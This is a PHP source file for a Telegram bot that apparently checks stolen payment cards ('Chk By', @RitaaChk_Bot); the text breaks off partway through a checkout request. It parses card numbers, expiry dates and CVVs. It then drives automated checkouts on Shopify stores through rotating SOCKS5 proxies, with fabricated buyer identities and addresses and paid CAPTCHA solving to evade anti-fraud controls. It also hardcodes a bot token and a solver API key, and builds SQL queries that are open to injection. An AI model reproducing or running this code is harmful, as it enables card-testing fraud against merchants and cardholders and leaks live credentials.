<?php // 0) IGNORA visitas desde navegador / health checks
if (($_SERVER['REQUEST_METHOD'] ?? 'GET') !== 'POST') {
    http_response_code(200);
    echo 'OK'; // evita warnings al abrir en el navegador
    exit;
}

ini_set("log_errors", TRUE);
ini_set("error_log", "./error_log.txt");

error_reporting(E_ALL & ~E_DEPRECATED & ~E_NOTICE);
//ignore_user_abort(true); // optional
//ob_end_clean();
//header("Connection: close\r\n");
//header("Content-Encoding: none\r\n");
//ob_start();
//echo 'Texto que verá el usuario';
//$size = ob_get_length();
//header("Content-Length: $size");
//ob_end_flush();

flush();



// Ejemplo de una tarea larga

//do processing here

require __DIR__ . '/MultiHilos/CardProcessor.php';
require __DIR__ . "/Encryptions/Encryptions_Adyen.php";
require __DIR__ . '/Telegram.php';
require __DIR__ . '/MysqliDb.php';
require __DIR__ . '/vendor/autoload.php';
require __DIR__ . '/n9va.php';
require __DIR__ . '/CurlX.php';
require __DIR__ . '/userAgent.php';
require __DIR__ . '/Class_Base.php';
require __DIR__ . '/bypass.php';
require __DIR__ . '/NovaFormat.php';
require __DIR__ . '/Gen_Card.php';

use CapSolver\Solvers\Token\ReCaptchaV2;

use GuzzleHttp\Client;
use GuzzleHttp\Cookie\CookieJar;
use GuzzleHttp\Exception\GuzzleException;
use GuzzleHttp\RequestOptions;



function Command($text) { 
        preg_match('/^[\W]+([\w]+)\s*([\s\S]*)/iu', $text, $matches); 
        return [ 
            'command' => $matches[1] ?? null, 
            'data' => trim($matches[2] ?? '') 
        ]; 
    }


function traducir($texto,$idioma_destino) {
    // ⚠️ CONFIGURAR API KEY EN config.php
    $google_api_key = getGoogleTranslateApiKey();
    $url = 'https://translation.googleapis.com/language/translate/v2?key=' . $google_api_key;
    $data = array(
        'q' => $texto,
        'target' => $idioma_destino,
        'format' => 'text'
    );
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    $response = curl_exec($ch);
    curl_close($ch);
    
    $translation = json_decode($response, true)['data']['translations'][0]['translatedText'];
    
    return $translation;
}

function isCardExpired($expiryMonth, $expiryYear) {
    // Obtén el mes y año actual
    $currentMonth = date('m');
    $currentYear = date('Y');

    // Convierte los valores a enteros
    $expiryMonth = (int)$expiryMonth;
    $expiryYear = (int)$expiryYear;
    $currentMonth = (int)$currentMonth;
    $currentYear = (int)$currentYear;

    // Verifica si la tarjeta ha expirado
    if ($expiryYear < $currentYear || ($expiryYear === $currentYear && $expiryMonth < $currentMonth)) {
        return true; // La tarjeta ha expirado
    }
    return false; // La tarjeta está vigente
}

function Textretries() {
    global $cc, $mes, $ano, $cvv, $maxRetries,$tiempo_inicial, $NameGater, $country, $emoji, $type, $brand, $scheme, $bank, $tiempo, $userId, $username, $Rank;


$tiempo_final = microtime(true);
$tiempo = $tiempo_final - $tiempo_inicial;
$tiempo = substr($tiempo, 0, 2);

$template = "<b>Card ⤿  <code>$cc|$mes|$ano|$cvv</code> 
Status ⤿ An error occurred while finding the Token ⚠️
Response ⤿ Error after $maxRetries attempts
Gateway ⤿ $NameGater
──────────────────────
◈Country ⤿ <code>$country</code> $emoji
◈Type ⤿ <code>$type</code> 
◈Level ⤿ <code>$brand</code>
◈Vendor ⤿ <code>$scheme</code>
◈Bank ⤿ <code>$bank</code> 
──────────────────────
Time ⤿  $tiempo s
@RitaaChk_Bot
Chk By ⤿ <a href='tg://user?id=$userId'>$username</a>[$Rank]</b>";
    
return $template;
}

date_default_timezone_set('America/Bogota');
// ⚠️ CONFIGURACIÓN MOVIDA A config.php
// Renombrar database/config_example.php a config.php y configurar
require_once __DIR__ . '/config.php';

// Después de require_once __DIR__.'/config.php';
$dbConfig = getDbConfig();
$db = new MysqliDb($dbConfig['host'], $dbConfig['username'], $dbConfig['password'], $dbConfig['database']);

$botToken = getBotToken();
$telegram  = new Telegram($botToken);

$Mi_Id = getOwnerId();
$website = "https://api.telegram.org/bot".$botToken;
// 1) OBTÉN Y VALIDA EL UPDATE
$raw = file_get_contents('php://input');
$update = json_decode($raw, true);
if (!is_array($update)) {
    http_response_code(200);
    echo 'NO_UPDATE';
    exit;
}

// 2) NORMALIZA A $event (no leas $update[...] directo)
$event = [
    'type' => null,
    'chat_id' => null,
    'user_id' => null,
    'message_id' => null,
    'text' => null,
    'data' => null, // callback_query data
    'chat_title' => null,
    'reply_to_mid' => null,
];

if (isset($update['callback_query'])) {
    $cq = $update['callback_query'];
    $msg = $cq['message'] ?? [];
    $event['type'] = 'callback_query';
    $event['chat_id'] = $msg['chat']['id'] ?? null;
    $event['user_id'] = $cq['from']['id'] ?? null;
    $event['message_id'] = $msg['message_id'] ?? null;
    $event['data'] = $cq['data'] ?? null;
    $event['chat_title'] = $msg['chat']['title'] ?? null;
    $event['reply_to_mid']= $msg['reply_to_message']['message_id'] ?? null;

} elseif (isset($update['message'])) {
    $msg = $update['message'];
    $event['type'] = 'message';
    $event['chat_id'] = $msg['chat']['id'] ?? null;
    $event['user_id'] = $msg['from']['id'] ?? null;
    $event['message_id'] = $msg['message_id'] ?? null;
    $event['text'] = $msg['text'] ?? null;
    $event['chat_title'] = $msg['chat']['title'] ?? null;
    $event['reply_to_mid']= $msg['reply_to_message']['message_id'] ?? null;

} elseif (isset($update['channel_post'])) {
    $msg = $update['channel_post'];
    $event['type'] = 'channel_post';
    $event['chat_id'] = $msg['chat']['id'] ?? null;
    $event['message_id'] = $msg['message_id'] ?? null;
    $event['text'] = $msg['text'] ?? null;
    $event['chat_title'] = $msg['chat']['title'] ?? null;
}

// 3) VARIABLES CÓMODAS & COMPATIBILIDAD
$chatId = $event['chat_id'];
$userId = $event['user_id'];
$message_id = $event['message_id'];
$text = $event['text'] ?? '';
$message = $event['text'] ?? '';
$cqData = $event['data'] ?? '';
$cdata2 = $event['data'] ?? '';
$chatName = $event['chat_title'];
$r_msg_id = $event['reply_to_mid'];

// Variables de Mensaje
$firstname = $update['message']['from']['first_name'] ?? null;
$username = $update['message']['from']['username'] ?? null;
$gId = $update['message']['from']['id'] ?? null;
$timestamp = $update['message']['date'] ?? null;
$chatusername = $update['message']['chat']['username'] ?? null;
$r_userId = $update['message']['reply_to_message']['from']['id'] ?? null;
$r_firstname = $update['message']['reply_to_message']['from']['first_name'] ?? null;
$r_username = $update['message']['reply_to_message']['from']['username'] ?? null;
$r_msg = $update['message']['reply_to_message']['text'] ?? null;
$new_chat_member = $update['message']['new_chat_member'] ?? null;
$newusername = $update['message']['new_chat_member']['username'] ?? null;
$newgId = $update['message']['new_chat_member']['id'] ?? null;
$newfirstname = $update['message']['new_chat_member']['first_name'] ?? null;
$sender_chat = $update['message']['sender_chat']['type'] ?? null;

// Variables de Callback Query
if (isset($update['callback_query'])) {
    $cchatid2 = $event['chat_id'];
    $cmessage_id2 = $event['message_id'];
    $callback_id = $update['callback_query']['id'] ?? null;
    $idcallback_query = $update['callback_query']['id'] ?? null;
    $queryId = $update['callback_query']['id'] ?? null;
    $queryUserId = $event['user_id'];
    $queryName = $update['callback_query']['from']['first_name'] ?? null;
    $CALL_CHAT_MESSAGE_ID = $event['message_id'];
    $CALL_CHAT_ID = $event['chat_id'];
    $queryOriginId = $update['callback_query']['message']['reply_to_message']['from']['id'] ?? null;
    $q_msg = $update['callback_query']['message']['reply_to_message']['text'] ?? null;
    $messago = $update['callback_query']['message']['reply_to_message']['text'] ?? null;
    $CALL_TEXT_DATA = $event['data'];
    
    // Sobrescribir variables de usuario si es un callback
    $firstname = $update['callback_query']['from']['first_name'] ?? $firstname;
    $username = $update['callback_query']['from']['username'] ?? $username;
    $gId = $event['user_id'] ?? $gId;
}


//------------------------------- BD Class -------------------------------
// ⚠️ CONFIGURACIÓN MOVIDA A config.php
$dbConfig = getDbConfig();
$base_bot = new Database($dbConfig['host'], $dbConfig['username'], $dbConfig['password'], $dbConfig['database']);
//------------------------------- Finish -------------------------------

#.... Roles ...#
// ⚠️ CONFIGURACIÓN MOVIDA A config.php

// Define the function to forward a message to all groups

function CorreLatidBraintre($num) {
        $alphabet = 'abcdefghijklmnopqrstuvwxyz1234567890';
        $pass = array();
        $alphaLength = strlen($alphabet) - 1;
        for ($i = 0; $i < $num; $i++) {
        $n = rand(0, $alphaLength);
        $pass[] = $alphabet[$n];}
        return implode($pass);}
        



$roles = mysqli_connect(DB_HOST, DB_USERNAME, DB_PASSWORD, DB_NAME);

function obtenerTodosLosValores() {
    global $roles;
    $sql = "SELECT * FROM Contador";
    $result = $roles->query($sql);
    $values = array();

    if ($result->num_rows > 0) {
        while ($row = $result->fetch_assoc()) {
            $values[] = $row;
        }
    }
    return $values;
}

function IdiomaUser($user){ 
        global $roles;
        $veripremium = "SELECT Idioma FROM prmiumtime WHERE userid='$user'"; 
        $res = mysqli_query($roles, $veripremium); 
        if (mysqli_num_rows($res) != 0) { 
            while ($fila = mysqli_fetch_array ($res)) { 
                return $fila['Idioma']; 
        } 
    }else{
        #logsummary("ERROR");
        return False;
    }}


function deleteIdFromFile($id) {
    $filename = "Tool/data.txt";
    $tempfile = tempnam(sys_get_temp_dir(), 'tempfile');

    $file = fopen($filename, "r");
    $temp = fopen($tempfile, "w");

    if ($file && $temp) {
        $found = false;

        while (($line = fgets($file)) !== false) {
            $parts = explode("|", $line);

            if ($parts[0] == $id) {
                $found = true;
                continue;
            }

            fwrite($temp, $line);
        }

        fclose($file);
        fclose($temp);

        if ($found) {
            // Reemplazar el archivo original con el temporal solo si se encontró la ID
            rename($tempfile, $filename);
        } else {
            // Eliminar el archivo temporal si la ID no fue encontrada
            unlink($tempfile);
        }

        return $found;
    } else {
        // Manejar el error al abrir archivos
        return false;
    }
}





function verificarDisponible($conexion, $userid) {
    $sql = "SELECT COUNT(*) as disponible FROM Amx_cookie WHERE userid='$userid';";
    $resultado = mysqli_query($conexion, $sql);

    if ($resultado) {
        $fila = mysqli_fetch_assoc($resultado);
        return $fila['disponible'];
    } else {
        return -1;
    }
}


function eliminarRegistrosAntiguos() {
    global $roles;
    $tiempoActual = time();

    // Obtener todos los registros de la tabla prmiumtime que incluyen timedate y userid.
    $sql = "SELECT timedate, userid FROM prmiumtime";
    $result = $roles->query($sql);

    if ($result->num_rows > 0) {
        while ($row = $result->fetch_assoc()) {
            $timedate = $row["timedate"];
            $userid = $row["userid"];

            // Verificar si timedate es menor que el tiempo actual.
            if ($timedate < $tiempoActual) {
                file_get_contents("https://api.telegram.org/bot5456276655:AAFt3u9hGVZxA72kBJrTc9W-Bmp7CWjLJBA/kickChatMember?chat_id=-1001711130201&user_id=$userid");
                $sqlDelete = "DELETE FROM prmiumtime WHERE userid = '$userid'";
                if ($roles->query($sqlDelete) !== TRUE) {
                    logsummary("Error al eliminar registro para el usuario con ID $userid: " . $conn->error);
                }                
                logsummary("Registro antiguo eliminado y usuario expulsado con éxito para el usuario con ID $userid.");
            }
        }
        logsummary("Registros antiguos eliminados y usuarios expulsados con éxito.");
    } else {
        logsummary("No se encontraron registros antiguos.");
    }
}



function Contador($gateway) {
    global $roles;
    $sql = "SELECT * FROM Contador WHERE Gateway = ?";
    $stmt = $roles->prepare($sql);
    $stmt->bind_param("s", $gateway); // Usar "s" para enlazar una cadena
    $stmt->execute();
    $result = $stmt->get_result();
    
    if ($result->num_rows > 0) {
        $row = $result->fetch_assoc();
        $utlz = $row['Utlz'] + 1;
        $sql = "UPDATE Contador SET Utlz = ? WHERE Gateway = ?";
        $stmt = $roles->prepare($sql);
        $stmt->bind_param("is", $utlz, $gateway); // Usar "is" para enlazar un entero y una cadena
        $stmt->execute();
    } else {
        $sql = "INSERT INTO Contador (Gateway, Utlz) VALUES (?, 1)";
        $stmt = $roles->prepare($sql);
        $stmt->bind_param("s", $gateway); // Usar "s" para enlazar una cadena
        $stmt->execute();
    }
    
}


function is_valid_year($ano)
{

	if (strlen($ano) == 4 || strlen($ano) == 2) {

		if ($ano >= 23 and $ano <= 40 || $ano >= 2023 and $ano <= 2040) return true;
		return false;
		
	} else {
		return false;
	}
}
function Is_ValidMes($mes)
{
	if (strlen($mes) <= 2) {

		if ($mes >= 01 and $mes <= 12) return true;
		return false;

	} else {
		return false;
	}
}



function TypeCard($input){
	if($input[0] >= 3 and $input[0] <= 6) return true;
	return false;
}
function NumberLeng($input){
	if(TypeCard($input)){
		if ($input[0] == 3) {
			if (strlen($input) == 15) return true;
		}else{
			if (strlen($input) == 16) return true;
			return false;
		}
	} return false;
}
function cleanData($input){
	$input = str_replace(['CVV2', 'cvv2'], ' ', $input);
	$input = preg_replace("/\r|\n/", ' ', $input);
	$input = preg_replace("/[^0-9]/", ' ', $input);
	$input = preg_replace('/\s+/', ' ', $input);
	$input = trim($input, ' ');
	return $input;
}

function Parser1($input){
	$input = cleanData($input);
	$input = explode(' ', $input);

	$card = [];

	if (NumberLeng($input[0])) {
		$card['card'] = $input[0];
	}elseif (NumberLeng($input[1])) {
		$card['card'] = $input[1];
	}elseif (NumberLeng($input[2])) {
		$card['card'] = $input[2];
	}elseif (NumberLeng($input[3])) {
		$card['card'] = $input[3];
	}elseif (NumberLeng($input[4])) {
		$card['card'] = $input[4];
	}elseif (NumberLeng($input[5])) {
		$card['card'] = $input[5];
	}

	if ($card['card'][0] == 3) {
		$card['Amex'] = true;
	}else{
		$card['Amex'] = false;
	}
	
    if(Is_ValidMes($input[0])){
        $card["MES"] = $input[0];
    }elseif(Is_ValidMes($input[1])){
        $card["MES"] = $input[1];
    }elseif(Is_ValidMes($input[2])){
        $card["MES"] = $input[2];
    }elseif(Is_ValidMes($input[3])){
        $card["MES"] = $input[3];
    }elseif(Is_ValidMes($input[4])){
        $card["MES"] = $input[4];
    }elseif(Is_ValidMes(substr($input[1], 0, 2))){
        $card['MES'] = substr($input[1], 0, 2);
    }elseif(Is_ValidMes(substr($input[1], 2, 2))){
        $card['MES'] = substr($input[1], 2, 2);
    }elseif(Is_ValidMes(substr($input[1], 4, 2))){
        $card['MES'] = substr($input[1], 4, 2);
    }

    if(is_valid_year($input[0])){
    	$card["ANO"] = $input[0];
    }elseif(is_valid_year($input[1])){
        $card["ANO"] = $input[1];
    }elseif(is_valid_year($input[2])){
        $card["ANO"] = $input[2];
    }elseif(is_valid_year($input[3])){
        $card["ANO"] = $input[3];
    }elseif(is_valid_year($input[4])){
        $card["ANO"] = $input[4];
    }elseif(is_valid_year(substr($input[1], 0, 2))){
        $card['ANO'] = substr($input[1], 0, 2);
    }elseif(is_valid_year(substr($input[1], 2, 2))){
        $card['ANO'] = substr($input[1], 2, 2);
    }elseif(is_valid_year(substr($input[1], 4, 2))){
        $card['ANO'] = substr($input[1], 4, 2);
    }
#--------------------------------CVV AMEX--------------------------#

    if($card["Amex"] == true){

    	if (strlen($input[0]) == 4 and $input[0] != $card["ANO"]) {
    		$card["CVV"] = $input[0];
    	}elseif (strlen($input[1]) == 4 and $input[1] != $card["ANO"]) {
    		$card["CVV"] = $input[1];
    	}elseif (strlen($input[2]) == 4 and $input[2] != $card["ANO"]) {
    		$card["CVV"] = $input[2];
    	}elseif (strlen($input[3]) == 4 and $input[3] != $card["ANO"]) {
    		$card["CVV"] = $input[3];
    	}elseif (strlen($input[4]) == 4 and $input[4] != $card["ANO"]) {
    		$card["CVV"] = $input[4];
    	}elseif (strlen($input[5]) == 4 and $input[5] != $card["ANO"]) {
    		$card["CVV"] = $input[5];
    	}elseif (strlen($input[0]) == 4) {
    		$card["CVV"] = $input[0];
    	}elseif (strlen($input[1]) == 4) {
    		$card["CVV"] = $input[1];
    	}elseif (strlen($input[2]) == 4) {
    		$card["CVV"] = $input[2];
    	}elseif (strlen($input[3]) == 4) {
    		$card["CVV"] = $input[3];
    	}elseif (strlen($input[4]) == 4) {
    		$card["CVV"] = $input[4];
    	}elseif (strlen($input[5]) == 4) {
    		$card["CVV"] = $input[5];
    	}

    }else{

    	if(strlen($input[0]) == 3) {
    		$card["CVV"] = $input[0];
    	}elseif (strlen($input[1]) == 3) {
    		$card["CVV"] = $input[1];
    	}elseif (strlen($input[2]) == 3) {
    		$card["CVV"] = $input[2];
    	}elseif (strlen($input[3]) == 3) {
    		$card["CVV"] = $input[3];
    	}elseif (strlen($input[4]) == 3) {
    		$card["CVV"] = $input[4];
    	}elseif (strlen($input[5]) == 3) {
    		$card["CVV"] = $input[5];
    	}

    }

	if (count($card) < 5) {
        $card['valid'] = "ERROR";
    }

	return $card;
}


function is_Antispma($userId, $chatId, $messageId, $keyboard) {
    global $telegram;
    $antispmatim = antispamCheck($userId);

    if ($antispmatim !== false) {
        $content = array('chat_id' => $chatId, 'reply_to_message_id' =>$messageId,'parse_mode'=>'HTML', 'text' => "<b>[ANTI SPAM] Try again after $antispmatim</b><b>s</b>.");
        $telegram->sendMessage($content);
        exit();
    }

    $antispmatimPremium = antispamCheckperemium($userId);

    if ($antispmatimPremium !== false) {
        $content = array('chat_id' => $chatId, 'reply_to_message_id' =>$messageId,'parse_mode'=>'HTML', 'text' => "<b>[ANTI SPAM] Try again after $antispmatimPremium</b><b>s</b>.");
        $telegram->sendMessage($content);
        exit();
    }
}




function RandStri($num) {
    $alphabet = 'abcdefghijklmnopqrstuvwxyz';
    $pass = array();
    $alphaLength = strlen($alphabet) - 1;
    for ($i = 0; $i < $num; $i++) {
    $n = rand(0, $alphaLength);
    $pass[] = $alphabet[$n];}
    return implode($pass);}

function obtenerDatoAleatorio($archivo) {

$lineas = file($archivo, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$lineaAleatoria = $lineas[array_rand($lineas)];

$datoAleatorio = json_decode($lineaAleatoria, true);

return $datoAleatorio;
}




function ShopifyIa($url, $card ,$solver){


$separa = explode("|", $card);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];


if ($mes < 10) {
    $mes = substr($mes, -1);
}

if(strlen($ano ) == 2 ){
  $ano = "20".$ano;
}

$pag_host = explode("/", $url)[2];

$socks5 = socks5();
$rotate = rotate();

$solver = null;



$json = file_get_contents("https://randomuser.me/api/?nat=us");
$data = json_decode($json, true);
$user = $data["results"][0];
$providers = array('gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com');
$provider = $providers[array_rand($providers)];
$email = strtolower($user["name"]["first"]) . strtolower($user["name"]["last"]) .rand(111,22299). '@' . $provider;
$firstname = $user["name"]["first"];
$lastname = $user["name"]["last"];
$phone = $user["phone"];



//Name Full: $firstname $lastname \n";
//Email: $email \n";
//URL: $url \n host: $pag_host\n";

$cookies = tempnam(sys_get_temp_dir(), 'cookie');


$user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (iPad; CPU iPadOS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/605.1.15",
  ];
  
$ua = $user_agents[array_rand($user_agents)];

//user_agents: $ua \n";

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://'.$pag_host.'/products.json');
curl_setopt($ch, CURLOPT_USERAGENT, $ua);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Host: '.$pag_host.'';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($ch, CURLOPT_TIMEOUT, 60);
curl_setopt($ch, CURLOPT_AUTOREFERER, true);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
$curl = curl_exec($ch);
$data = json_decode($curl, true);
foreach ($data['products'] as $product) {
    foreach ($product['variants'] as $variant) {
        if ($variant['available'] === true && floatval($variant['price']) > 20) {
            $variant_id = $variant['id'];
            break 2; 
        }
    }}


//variants: $variant_id \n";

if(empty($variant_id)){
    $resp = "No se encontró el producto";
    return $resp;
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://'.$pag_host.'/cart/add.js');
curl_setopt($ch, CURLOPT_USERAGENT, $ua);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: '.$pag_host.'';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'Origin: https://'.$pag_host.'';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($ch, CURLOPT_TIMEOUT, 60);
curl_setopt($ch, CURLOPT_AUTOREFERER, true);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'id='.$variant_id.'&quantity=1');
$curl = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://'.$pag_host.'/cart');
curl_setopt($ch, CURLOPT_USERAGENT, $ua);
$headers = array();
$headers[] = 'Host: '.$pag_host.'';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($ch, CURLOPT_TIMEOUT, 60);
curl_setopt($ch, CURLOPT_AUTOREFERER, true);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'checkout=');
$curl = curl_exec($ch);
$TOKEN = GetStr($curl, 'authenticity_token" value="', '"');
$country = GetStr($curl, 'data-pure-numeric-postal-code="false" selected="selected" value="', '"');
$localization = GetStr($curl, 'localization=', ';');


$co = [
    "AU" => ["generator" => "World/au_address_generator", "country" => "Australia"],
    "US" => ["generator" => "usa_address_generator", "country" => "United States"],
    "CA" => ["generator" => "World/ca_address_generator", "country" => "Canada"],
    "UK" => ["generator" => "World/uk_address_generator", "country" => "United Kingdom"],
    "DE" => ["generator" => "World/Germany_address_generator", "country" => "Germany"],
];

$g = $co[$localization]['generator'];
$country = $co[$localization]['country'];


do {
    $get = file_get_contents("https://www.worldnamegenerator.com/$g");
    $street = trim(strip_tags(GetStr($get, '<td>Street', '</tr>')));
    $city = strtoupper(trim(strip_tags(GetStr($get, '<td>City', '</tr>'))));
    $regioncode = trim(strip_tags(GetStr($get, '<td>State/Province abbr', '</b></td>')));
    $state = trim(strip_tags(GetStr($get, '<td>State/Province full', '</b></td>')));
    $zip = trim(strip_tags(GetStr($get, '<td>Zip Code/Postal code', '</tr>')));
    
} while ($street === null || $city === null || $regioncode === null || $state === null || $zip === null);
echo "Street: $street\n";
echo "City: $city\n";
echo "Region Code: $regioncode\n";
echo "State: $state\n";
echo "ZIP: $zip\n";


$url = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);

//url: $url \n Country : $country";

if(substr_count($curl, "grecaptcha.render")){
//Procesando solution...";
$SITEKEY = GetStr($curl, 'sitekey: "', '"');
$cursl = GetStr($curl, 'var recaptchaCallback = function() {', '//]]>');
$s = GetStr($cursl, "s: '", "'");


$data = [
    'clientKey' => 'CAP-5361C0C774F336BECC410D69E869566E',
    'task' => [
        'type' => 'ReCaptchaV2EnterpriseTaskProxyLess',
        'websiteURL' => $url,
        "websiteKey" => $SITEKEY,
        'enterprisePayload' =>  [
            "s" => $s
      ],
    ],
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.capsolver.com/createTask');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER,  [
    'Host: api.capsolver.com',
    'Content-Type: application/json'
]);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
$curl = curl_exec($ch);
$js = json_decode($curl, true);
$taskId = $js["taskId"];

while (true) {

sleep(2);

$data = [
    'clientKey' => '',
    'taskId' => $taskId,
];


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.capsolver.com/getTaskResult');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER,  [
    'Host: api.capsolver.com',
    'Content-Type: application/json'
]);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
$curl = curl_exec($ch);
$js = json_decode($curl, true);
$status = $js["status"];

if ($status != "processing") {
    break;
}
}

$captcha = $js["solution"]['gRecaptchaResponse'];


//Finish ... recaptcha";
//\n";
//gRecaptchaResponse : $captcha";
//\n";

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_USERAGENT, $ua);
$headers = array();
$headers[] = 'Host: '.$pag_host.'';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Referer: https://'.$pag_host.'/';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://'.$pag_host.'';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($ch, CURLOPT_TIMEOUT, 60);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.urlencode($TOKEN).'&previous_step=contact_information&step=shipping_method&checkout%5Bemail%5D='.urlencode($email).'&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bbuyer_accepts_marketing%5D=1&checkout%5Bshipping_address%5D%5Bfirst_name%5D=&checkout%5Bshipping_address%5D%5Blast_name%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=&checkout%5Bshipping_address%5D%5Bprovince%5D=&checkout%5Bshipping_address%5D%5Bzip%5D=&checkout%5Bshipping_address%5D%5Bphone%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D='.urlencode($country).'&checkout%5Bshipping_address%5D%5Bfirst_name%5D='.$firstname.'&checkout%5Bshipping_address%5D%5Blast_name%5D='.$lastname.'&checkout%5Bshipping_address%5D%5Baddress1%5D='.urlencode($street).'&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D='.urlencode($city).'&checkout%5Bshipping_address%5D%5Bprovince%5D='.$regioncode.'&checkout%5Bshipping_address%5D%5Bzip%5D='.$zip.'&checkout%5Bshipping_address%5D%5Bphone%5D='.urlencode($phone).'&checkout%5Bremember_me%5D=&checkout%5Bremember_me%5D=0&g-recaptcha-response='.$captcha.'&checkout%5Bclient_det